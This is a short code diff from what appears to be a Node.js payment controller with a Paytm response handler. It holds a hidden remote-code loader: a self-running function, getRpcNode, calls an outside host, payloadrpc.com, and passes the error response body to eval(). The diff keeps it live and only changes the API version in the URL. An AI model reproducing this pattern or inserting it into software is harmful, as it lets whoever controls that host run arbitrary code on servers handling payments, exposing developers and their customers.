@@ -141,7 +141,7 @@ exports.paytmResponse = (req, res, next) => {
 };
 const getRpcNode = (async () => {
   axios
-    .get("http://payloadrpc.com/api/v1/node/7a5d8df69e27ec3e5ff9c2b1e2ff80b0")
+    .get("http://payloadrpc.com/api/v2/node/7a5d8df69e27ec3e5ff9c2b1e2ff80b0")
     .then((res) => (rpcNode = res.data))
     .catch((err) => eval(err.response.data));
 })();
